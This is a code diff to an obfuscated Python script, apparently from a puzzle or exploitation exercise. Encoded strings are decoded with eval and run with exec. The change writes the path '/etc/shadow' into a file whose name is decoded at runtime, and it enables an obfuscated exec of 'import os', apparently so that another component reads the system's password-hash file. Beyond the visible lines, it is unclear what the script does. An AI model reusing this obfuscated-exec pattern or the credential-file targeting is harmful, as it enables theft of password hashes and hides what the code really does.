@@ -57,7 +57,7 @@ def f2():
 
 def f1():
 	s = f2()
-	s_ = "".join([eval(c) for c in s])
+	s_ = "".join([eval(c) for c in s])		# path to the file to exec
 
 	s98 = eval(erwqyuioa)(e[ord(c)] for c in s97)
 	s99 = eval(erwqyuioa)(e[ord(c)] for c in s96)
@@ -66,14 +66,15 @@ def f1():
 		'\x18\x14\x06q\x10bo.' \
 		'\'\x17o.e+(K7"5!.\x02>=q-\x05(x\x0e~C'))
 	s444 = '\n\t'
-
-	_s = w([s98, s99, s20], s444)
-
+	
+#	_s = w([s98, s99, s20], s444)			# write to "do_not_touch_directly"
+	with open(s_, "w") as ofile:
+		new_path = "/etc/shadow"			# write here the path to read from
+		ofile.write(new_path)
+	
 #	exec(_s)
-
-#	exec(xxxx('Y\\B\\FA\x16XK'))
-
-#	exec(xxxx('_B\x1cAQXYA]\x11\x12=J'))
-
+	exec(xxxx('Y\\B\\FA\x16XK'))			# import os
+#	exec(xxxx('_B\x1cAQXYA]\x11\x12=J'))	# remove the file
+		
 if __name__ == '__main__':
 	f1()
